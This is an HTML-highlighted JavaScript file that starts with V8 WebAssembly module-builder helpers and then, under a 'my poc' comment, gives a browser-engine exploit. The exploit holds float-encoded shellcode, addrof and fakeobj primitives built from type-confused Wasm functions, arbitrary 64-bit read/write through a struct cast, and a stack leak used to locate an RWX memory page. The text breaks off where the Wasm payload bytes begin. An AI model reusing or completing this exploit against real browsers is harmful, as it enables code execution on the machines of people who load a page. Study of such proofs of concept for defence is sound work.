            <span class="hljs-keyword">let</span> hints = targets_for_offset.<span class="hljs-property">targets</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">target</span> =&gt;</span> {
              <span class="hljs-keyword">return</span> {
                <span class="hljs-attr">function_index</span>: <span class="hljs-title function_">wasmUnsignedLeb</span>(target.<span class="hljs-property">function_index</span>),
                <span class="hljs-attr">frequency_percent</span>: <span class="hljs-title function_">wasmUnsignedLeb</span>(target.<span class="hljs-property">frequency_percent</span>)
              }
            })
            <span class="hljs-keyword">var</span> hint_length = <span class="hljs-number">0</span>;
            hints.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">hint</span> =&gt;</span> {
              hint_length += hint.<span class="hljs-property">function_index</span>.<span class="hljs-property">length</span>;
              hint_length += hint.<span class="hljs-property">frequency_percent</span>.<span class="hljs-property">length</span>;
            });
            section.<span class="hljs-title function_">emit_u32v</span>(hint_length);
            hints.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">hint</span> =&gt;</span> {
              section.<span class="hljs-title function_">emit_u32v</span>(hint.<span class="hljs-property">function_index</span>);
              section.<span class="hljs-title function_">emit_u32v</span>(hint.<span class="hljs-property">frequency_percent</span>);
            })
          })
        })
      })
    }

    <span class="hljs-keyword">return</span> binary.<span class="hljs-title function_">trunc_buffer</span>();
  }

  <span class="hljs-title function_">toArray</span>(<span class="hljs-params">debug = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">toBuffer</span>(debug));
  }

  <span class="hljs-title function_">instantiate</span>(<span class="hljs-params">ffi, options</span>) {
    <span class="hljs-keyword">let</span> <span class="hljs-variable language_">module</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">toModule</span>(options);
    <span class="hljs-keyword">let</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(<span class="hljs-variable language_">module</span>, ffi);
    <span class="hljs-keyword">return</span> instance;
  }

  <span class="hljs-title function_">asyncInstantiate</span>(<span class="hljs-params">ffi</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title function_">instantiate</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">toBuffer</span>(), ffi)
        .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">{<span class="hljs-variable language_">module</span>, instance}</span>) =&gt;</span> instance);
  }

  <span class="hljs-title function_">toModule</span>(<span class="hljs-params">options, debug = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">toBuffer</span>(debug), options);
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-params">val, max_len = <span class="hljs-number">5</span></span>) {
  <span class="hljs-keyword">if</span> (val == <span class="hljs-literal">null</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Leb value may not be null/undefined&quot;</span>);
  <span class="hljs-keyword">let</span> res = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; max_len; ++i) {
    <span class="hljs-keyword">let</span> v = val &amp; <span class="hljs-number">0x7f</span>;
    <span class="hljs-comment">// If {v} sign-extended from 7 to 32 bits is equal to val, we are done.</span>
    <span class="hljs-keyword">if</span> (((v &lt;&lt; <span class="hljs-number">25</span>) &gt;&gt; <span class="hljs-number">25</span>) == val) {
      res.<span class="hljs-title function_">push</span>(v);
      <span class="hljs-keyword">return</span> res;
    }
    res.<span class="hljs-title function_">push</span>(v | <span class="hljs-number">0x80</span>);
    val = val &gt;&gt; <span class="hljs-number">7</span>;
  }
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
      <span class="hljs-string">&#x27;Leb value &lt;&#x27;</span> + val + <span class="hljs-string">&#x27;&gt; exceeds maximum length of &#x27;</span> + max_len);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmSignedLeb64</span>(<span class="hljs-params">val, max_len = <span class="hljs-number">10</span></span>) {
  <span class="hljs-keyword">if</span> (val == <span class="hljs-literal">null</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Leb value may not be null/undefined&quot;</span>);
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> val != <span class="hljs-string">&quot;bigint&quot;</span>) {
    <span class="hljs-keyword">if</span> (val &lt; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">31</span>)) {
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">wasmSignedLeb</span>(val, max_len);
    }
    val = <span class="hljs-title class_">BigInt</span>(val);
  }
  <span class="hljs-keyword">let</span> res = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; max_len; ++i) {
    <span class="hljs-keyword">let</span> v = val &amp; <span class="hljs-number">0x7fn</span>;
    <span class="hljs-comment">// If {v} sign-extended from 7 to 32 bits is equal to val, we are done.</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">BigInt</span>.<span class="hljs-title function_">asIntN</span>(<span class="hljs-number">7</span>, v) == val) {
      res.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Number</span>(v));
      <span class="hljs-keyword">return</span> res;
    }
    res.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Number</span>(v) | <span class="hljs-number">0x80</span>);
    val = val &gt;&gt; <span class="hljs-number">7n</span>;
  }
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
      <span class="hljs-string">&#x27;Leb value &lt;&#x27;</span> + val + <span class="hljs-string">&#x27;&gt; exceeds maximum length of &#x27;</span> + max_len);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmUnsignedLeb</span>(<span class="hljs-params">val, max_len = <span class="hljs-number">5</span></span>) {
  <span class="hljs-keyword">if</span> (val == <span class="hljs-literal">null</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Leb value many not be null/undefined&quot;</span>);
  <span class="hljs-keyword">let</span> res = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; max_len; ++i) {
    <span class="hljs-keyword">let</span> v = val &amp; <span class="hljs-number">0x7f</span>;
    <span class="hljs-keyword">if</span> (v == val) {
      res.<span class="hljs-title function_">push</span>(v);
      <span class="hljs-keyword">return</span> res;
    }
    res.<span class="hljs-title function_">push</span>(v | <span class="hljs-number">0x80</span>);
    val = val &gt;&gt;&gt; <span class="hljs-number">7</span>;
  }
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
      <span class="hljs-string">&#x27;Leb value &lt;&#x27;</span> + val + <span class="hljs-string">&#x27;&gt; exceeds maximum length of &#x27;</span> + max_len);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmI32Const</span>(<span class="hljs-params">val</span>) {
  <span class="hljs-keyword">return</span> [kExprI32Const, ...<span class="hljs-title function_">wasmSignedLeb</span>(val, <span class="hljs-number">5</span>)];
}

<span class="hljs-comment">// Note: Since {val} is a JS number, the generated constant only has 53 bits of</span>
<span class="hljs-comment">// precision.</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmI64Const</span>(<span class="hljs-params">val</span>) {
  <span class="hljs-keyword">return</span> [kExprI64Const, ...<span class="hljs-title function_">wasmSignedLeb64</span>(val, <span class="hljs-number">10</span>)];
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmF32Const</span>(<span class="hljs-params">f</span>) {
  <span class="hljs-comment">// Write in little-endian order at offset 0.</span>
  data_view.<span class="hljs-title function_">setFloat32</span>(<span class="hljs-number">0</span>, f, <span class="hljs-literal">true</span>);
  <span class="hljs-keyword">return</span> [
    kExprF32Const, byte_view[<span class="hljs-number">0</span>], byte_view[<span class="hljs-number">1</span>], byte_view[<span class="hljs-number">2</span>], byte_view[<span class="hljs-number">3</span>]
  ];
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmF64Const</span>(<span class="hljs-params">f</span>) {
  <span class="hljs-comment">// Write in little-endian order at offset 0.</span>
  data_view.<span class="hljs-title function_">setFloat64</span>(<span class="hljs-number">0</span>, f, <span class="hljs-literal">true</span>);
  <span class="hljs-keyword">return</span> [
    kExprF64Const, byte_view[<span class="hljs-number">0</span>], byte_view[<span class="hljs-number">1</span>], byte_view[<span class="hljs-number">2</span>], byte_view[<span class="hljs-number">3</span>],
    byte_view[<span class="hljs-number">4</span>], byte_view[<span class="hljs-number">5</span>], byte_view[<span class="hljs-number">6</span>], byte_view[<span class="hljs-number">7</span>]
  ];
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmS128Const</span>(<span class="hljs-params">f</span>) {
  <span class="hljs-comment">// Write in little-endian order at offset 0.</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(f)) {
    <span class="hljs-keyword">if</span> (f.<span class="hljs-property">length</span> != <span class="hljs-number">16</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;S128Const needs 16 bytes&#x27;</span>);
    <span class="hljs-keyword">return</span> [kSimdPrefix, kExprS128Const, ...f];
  }
  <span class="hljs-keyword">let</span> result = [kSimdPrefix, kExprS128Const];
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span> === <span class="hljs-number">2</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">2</span>; j++) {
      data_view.<span class="hljs-title function_">setFloat64</span>(<span class="hljs-number">0</span>, <span class="hljs-variable language_">arguments</span>[j], <span class="hljs-literal">true</span>);
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) result.<span class="hljs-title function_">push</span>(byte_view[i]);
    }
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span> === <span class="hljs-number">4</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {
      data_view.<span class="hljs-title function_">setFloat32</span>(<span class="hljs-number">0</span>, <span class="hljs-variable language_">arguments</span>[j], <span class="hljs-literal">true</span>);
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) result.<span class="hljs-title function_">push</span>(byte_view[i]);
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;S128Const needs an array of bytes, or two f64 values, &#x27;</span> +
                    <span class="hljs-string">&#x27;or four f32 values&#x27;</span>);
  }
  <span class="hljs-keyword">return</span> result;
}

<span class="hljs-keyword">let</span> wasmEncodeHeapType = <span class="hljs-keyword">function</span>(<span class="hljs-params">type</span>) {
  <span class="hljs-keyword">let</span> result = <span class="hljs-title function_">wasmSignedLeb</span>(type.<span class="hljs-property">heap_type</span>, kMaxVarInt32Size);
  <span class="hljs-keyword">if</span> (type.<span class="hljs-property">is_shared</span>) {
    result = [kWasmSharedTypeForm].<span class="hljs-title function_">concat</span>(result);
  }
  <span class="hljs-keyword">if</span> (type.<span class="hljs-property">is_exact</span>) {
    result = [kWasmExact].<span class="hljs-title function_">concat</span>(result);
  }
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-keyword">let</span> [wasmBrOnCast, wasmBrOnCastFail, wasmBrOnCastDesc, wasmBrOnCastDescFail] =
(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">return</span> [
    <span class="hljs-function">(<span class="hljs-params">labelIdx, sourceType, targetType</span>) =&gt;</span>
      <span class="hljs-title function_">wasmBrOnCastImpl</span>(labelIdx, sourceType, targetType, kExprBrOnCast),
    <span class="hljs-function">(<span class="hljs-params">labelIdx, sourceType, targetType</span>) =&gt;</span>
      <span class="hljs-title function_">wasmBrOnCastImpl</span>(labelIdx, sourceType, targetType, kExprBrOnCastFail),
    <span class="hljs-function">(<span class="hljs-params">labelIdx, sourceType, targetType</span>) =&gt;</span>
      <span class="hljs-title function_">wasmBrOnCastImpl</span>(labelIdx, sourceType, targetType, kExprBrOnCastDesc),
    <span class="hljs-function">(<span class="hljs-params">labelIdx, sourceType, targetType</span>) =&gt;</span>
      <span class="hljs-title function_">wasmBrOnCastImpl</span>(labelIdx, sourceType, targetType, kExprBrOnCastDescFail),
  ];
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmBrOnCastImpl</span>(<span class="hljs-params">labelIdx, sourceType, targetType, opcode</span>) {
    labelIdx = <span class="hljs-title function_">wasmUnsignedLeb</span>(labelIdx, kMaxVarInt32Size);
    <span class="hljs-keyword">let</span> srcIsNullable = sourceType.<span class="hljs-property">opcode</span> == kWasmRefNull;
    <span class="hljs-keyword">let</span> tgtIsNullable = targetType.<span class="hljs-property">opcode</span> == kWasmRefNull;
    flags = (tgtIsNullable &lt;&lt; <span class="hljs-number">1</span>) + srcIsNullable;
    <span class="hljs-keyword">return</span> [
      kGCPrefix, opcode, flags, ...labelIdx, ...<span class="hljs-title function_">wasmEncodeHeapType</span>(sourceType),
      ...<span class="hljs-title function_">wasmEncodeHeapType</span>(targetType)
    ];
  }
})();

<span class="hljs-keyword">function</span> <span class="hljs-title function_">getOpcodeName</span>(<span class="hljs-params">opcode</span>) {
  <span class="hljs-keyword">return</span> globalThis.<span class="hljs-property">kWasmOpcodeNames</span>?.[opcode] ?? <span class="hljs-string">&#x27;unknown&#x27;</span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmF32ConstSignalingNaN</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">return</span> [kExprF32Const, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7f</span>];
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmF64ConstSignalingNaN</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">return</span> [kExprF64Const, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x7f</span>];
}





<span class="hljs-comment">// ------------- my poc ------------- //</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">shellcode</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> [<span class="hljs-number">1.9553825422107533e-246</span>, <span class="hljs-number">1.9560612558242147e-246</span>, <span class="hljs-number">1.9995714719542577e-246</span>, <span class="hljs-number">1.9533767332674093e-246</span>, <span class="hljs-number">2.6348604765229606e-284</span>];
}


<span class="hljs-comment">// function</span>

<span class="hljs-comment">/* Conversion code from https://github.com/google/google-ctf/blob/main/2018/finals/pwn-just-in-time/exploit/index.html */</span>
<span class="hljs-keyword">let</span> conversion_buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>);
<span class="hljs-keyword">let</span> float_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(conversion_buffer);
<span class="hljs-keyword">let</span> int_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(conversion_buffer);

<span class="hljs-title class_">BigInt</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hex</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);
};

<span class="hljs-title class_">BigInt</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">i2f</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    int_view[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">return</span> float_view[<span class="hljs-number">0</span>];
}

<span class="hljs-title class_">BigInt</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">smi2f</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    int_view[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span> &lt;&lt; <span class="hljs-number">32n</span>;
    <span class="hljs-keyword">return</span> float_view[<span class="hljs-number">0</span>];
}

<span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">f2i</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    float_view[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">return</span> int_view[<span class="hljs-number">0</span>];
}

<span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">f2smi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    float_view[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">return</span> int_view[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">32n</span>;
}

<span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">i2f</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">BigInt</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">i2f</span>();
}

<span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">smi2f</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">BigInt</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">smi2f</span>();
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">time</span>){
	<span class="hljs-keyword">var</span> timeStamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();
	<span class="hljs-keyword">var</span> endTime = timeStamp + time;
	<span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>){
		<span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() &gt; endTime){
			<span class="hljs-keyword">return</span>;
		}
	}
}

<span class="hljs-comment">// function debug(objWrapper) {</span>
<span class="hljs-comment">// 	const objName = Object.keys(objWrapper)[0];</span>
<span class="hljs-comment">// 	const objValue = objWrapper[objName];</span>
<span class="hljs-comment">// 	console.log(`--- Debugging: ${objName} ---`);</span>
<span class="hljs-comment">// 	%DebugPrint(objValue);</span>
<span class="hljs-comment">// 	console.log(`--- End of: ${objName} ---`);</span>
<span class="hljs-comment">// }</span>


<span class="hljs-keyword">function</span> <span class="hljs-title function_">RandomLeak</span>(<span class="hljs-params"></span>) {
	<span class="hljs-keyword">const</span> sig = <span class="hljs-title function_">makeSig</span>([], [kWasmI64, kWasmI64, kWasmF64, kWasmF64]);
	<span class="hljs-keyword">const</span> builder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmModuleBuilder</span>();

	builder
		.<span class="hljs-title function_">addFunction</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, sig)
		.<span class="hljs-title function_">addBody</span>([
			<span class="hljs-comment">// kExprEnd,</span>
		])
		.<span class="hljs-title function_">exportFunc</span>();

	<span class="hljs-keyword">const</span> module_bytes = builder.<span class="hljs-title function_">toBuffer</span>();
	<span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(module_bytes);
	<span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(mod, {});
	<span class="hljs-keyword">var</span> ret_val = instance.<span class="hljs-property">exports</span>.<span class="hljs-title function_">bad</span>();
	<span class="hljs-keyword">return</span> ret_val;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>) {
	<span class="hljs-keyword">const</span> sig = <span class="hljs-title function_">makeSig</span>([kWasmExternRef], [kWasmI64]);
	<span class="hljs-keyword">const</span> builder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmModuleBuilder</span>();
	builder.<span class="hljs-title function_">addFunction</span>(<span class="hljs-string">&quot;addr&quot;</span>, sig)
		.<span class="hljs-title function_">addBody</span>([
			kExprLocalGet, <span class="hljs-number">0</span>,
		])
		.<span class="hljs-title function_">exportFunc</span>();
	<span class="hljs-keyword">const</span> module_bytes = builder.<span class="hljs-title function_">toBuffer</span>();
	<span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(module_bytes);
	<span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(mod, {});
	<span class="hljs-keyword">var</span> ret_val = instance.<span class="hljs-property">exports</span>.<span class="hljs-title function_">addr</span>(obj);
	<span class="hljs-keyword">return</span> ret_val;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeobj</span>(<span class="hljs-params">addr</span>) {
	<span class="hljs-keyword">const</span> sig = <span class="hljs-title function_">makeSig</span>([kWasmI64], [kWasmExternRef]);
	<span class="hljs-keyword">const</span> builder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmModuleBuilder</span>();
	builder.<span class="hljs-title function_">addFunction</span>(<span class="hljs-string">&quot;fake&quot;</span>, sig)
		.<span class="hljs-title function_">addBody</span>([
			kExprLocalGet, <span class="hljs-number">0</span>,
		])
		.<span class="hljs-title function_">exportFunc</span>();
	<span class="hljs-keyword">const</span> module_bytes = builder.<span class="hljs-title function_">toBuffer</span>();
	<span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(module_bytes);
	<span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(mod, {});
	<span class="hljs-keyword">var</span> ret_val = instance.<span class="hljs-property">exports</span>.<span class="hljs-title function_">fake</span>(addr);
	<span class="hljs-keyword">return</span> ret_val;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildStructI64CasterModule</span>(<span class="hljs-params"></span>) {
	<span class="hljs-keyword">const</span> builder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmModuleBuilder</span>();
	<span class="hljs-keyword">const</span> structType = builder.<span class="hljs-title function_">addStruct</span>(
		[<span class="hljs-title function_">makeField</span>(kWasmI64, <span class="hljs-literal">true</span>)],
		kNoSuperType,
		<span class="hljs-literal">true</span>,
		<span class="hljs-literal">false</span>,
	);

	<span class="hljs-keyword">const</span> refStructType = <span class="hljs-title function_">wasmRefType</span>(structType);

	<span class="hljs-keyword">const</span> sig_cast = <span class="hljs-title function_">makeSig</span>([kWasmI64], [refStructType]);
	<span class="hljs-keyword">const</span> cast = builder.<span class="hljs-title function_">addFunction</span>(<span class="hljs-string">&#x27;from_i64&#x27;</span>, sig_cast)
		.<span class="hljs-title function_">addBody</span>([
		kExprLocalGet, <span class="hljs-number">0</span>
	]);

	<span class="hljs-keyword">const</span> sig_set = <span class="hljs-title function_">makeSig</span>([kWasmI64, kWasmI64], []);  <span class="hljs-comment">// addr, val</span>
	builder.<span class="hljs-title function_">addFunction</span>(<span class="hljs-string">&#x27;set_field&#x27;</span>, sig_set)
		.<span class="hljs-title function_">addBody</span>([
			kExprLocalGet, <span class="hljs-number">0</span>,
			kExprCallFunction, ...<span class="hljs-title function_">wasmUnsignedLeb</span>(cast.<span class="hljs-property">index</span>, kMaxVarInt32Size),
			kExprLocalGet, <span class="hljs-number">1</span>,
			kGCPrefix, kExprStructSet,
			...<span class="hljs-title function_">wasmUnsignedLeb</span>(structType, kMaxVarInt32Size),  <span class="hljs-comment">// index</span>
			...<span class="hljs-title function_">wasmUnsignedLeb</span>(<span class="hljs-number">0</span>, kMaxVarInt32Size),
		])
		.<span class="hljs-title function_">exportFunc</span>();

	<span class="hljs-keyword">const</span> sig_get = <span class="hljs-title function_">makeSig</span>([kWasmI64], [kWasmI64]);  <span class="hljs-comment">// addr, val</span>
	builder.<span class="hljs-title function_">addFunction</span>(<span class="hljs-string">&#x27;get_field&#x27;</span>, sig_get)
		.<span class="hljs-title function_">addBody</span>([
			kExprLocalGet, <span class="hljs-number">0</span>,
			kExprCallFunction, ...<span class="hljs-title function_">wasmUnsignedLeb</span>(cast.<span class="hljs-property">index</span>, kMaxVarInt32Size),
			kGCPrefix, kExprStructGet,
			...<span class="hljs-title function_">wasmUnsignedLeb</span>(structType, kMaxVarInt32Size),  <span class="hljs-comment">// index</span>
			...<span class="hljs-title function_">wasmUnsignedLeb</span>(<span class="hljs-number">0</span>, kMaxVarInt32Size),
		])
		.<span class="hljs-title function_">exportFunc</span>();
	<span class="hljs-keyword">const</span> module_bytes = builder.<span class="hljs-title function_">toBuffer</span>();
	<span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(module_bytes);
	<span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(mod, {});
	<span class="hljs-keyword">return</span> instance.<span class="hljs-property">exports</span>;
}


(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>){
	<span class="hljs-string">&quot;use strict&quot;</span>;
	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
		<span class="hljs-keyword">var</span> _ = <span class="hljs-title class_">RandomLeak</span>();
	}

	<span class="hljs-keyword">let</span> stack_leak = <span class="hljs-title class_">RandomLeak</span>();

	<span class="hljs-keyword">const</span> structMod = <span class="hljs-title function_">buildStructI64CasterModule</span>();

	<span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>) {
		<span class="hljs-keyword">return</span> structMod.<span class="hljs-title function_">get_field</span>(addr + <span class="hljs-number">1n</span> - <span class="hljs-number">8n</span>);
	}
	<span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr, value</span>) {
		structMod.<span class="hljs-title function_">set_field</span>(addr + <span class="hljs-number">1n</span>, value);
	}

	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;stack_leak =&gt;&quot;</span>, stack_leak[<span class="hljs-number">0</span>], stack_leak[<span class="hljs-number">1</span>], stack_leak[<span class="hljs-number">2</span>], stack_leak[<span class="hljs-number">3</span>].<span class="hljs-title function_">f2i</span>().<span class="hljs-title function_">hex</span>());
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stack_leak[<span class="hljs-number">2</span>].<span class="hljs-title function_">f2i</span>());
	<span class="hljs-keyword">let</span> rwx_leak = <span class="hljs-title function_">read64</span>(stack_leak[<span class="hljs-number">2</span>].<span class="hljs-title function_">f2i</span>() - <span class="hljs-number">0x260n</span>) - <span class="hljs-number">0x204bn</span>;
<span class="hljs-comment">// pwn();</span>
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(rwx_leak.<span class="hljs-title function_">hex</span>());

	<span class="hljs-keyword">const</span> wasm_bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([
